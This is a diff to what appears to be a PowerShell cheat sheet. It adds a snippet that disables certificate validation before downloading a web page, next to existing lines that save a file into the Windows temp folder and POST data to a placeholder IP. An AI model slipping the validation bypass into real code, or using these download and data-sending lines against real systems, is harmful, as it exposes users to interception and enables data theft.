@@ -4,6 +4,10 @@ syntax: powershell
 # Download file via HTTP
 (New-Object System.Net.WebClient).DownloadFile("http://example.org/file.txt", "C:\Windows\TEMP\file.txt")
 
+# Download string via HTTPS and disable certificate validation
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+(New-Object System.Net.WebClient).DownloadString("https://example.org/")
+
 # Send POST data via HTTP
 Invoke-WebRequest -Uri 192.0.2.1 -Method Post -Body DATA
 echo DATA | Invoke-WebRequest -Uri 192.0.2.1 -Method Post
